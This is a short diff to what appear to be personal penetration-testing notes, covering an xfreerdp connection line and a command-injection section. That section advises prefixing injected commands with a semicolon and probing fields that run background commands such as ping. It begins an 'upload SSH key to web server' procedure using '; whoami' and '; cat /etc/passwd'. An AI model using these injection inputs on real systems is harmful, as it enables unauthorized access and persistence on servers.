@@ -9,7 +9,7 @@ xfreerdp /v:127.0.0.1:9999 /u:comrade /glyph-cache /clipboard /dynamic-resolutio
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 COMMAND INJECTION
-Begin all new commands with a ;
+Begin all new commands with a ;                           #LOOK FOR FIELDS THAT LOOK LIKE THEY MIGHT BE RUNNING COMMANDS IN THE BACKGROUND, PING, ETC
 UPLOAD SSH KEY TO WEB SERVER:
   ; whoami                                                #FIND OUT WHO YOU ARE
   ; cat /etc/passwd                                       #FIND HOME DIRECTORY
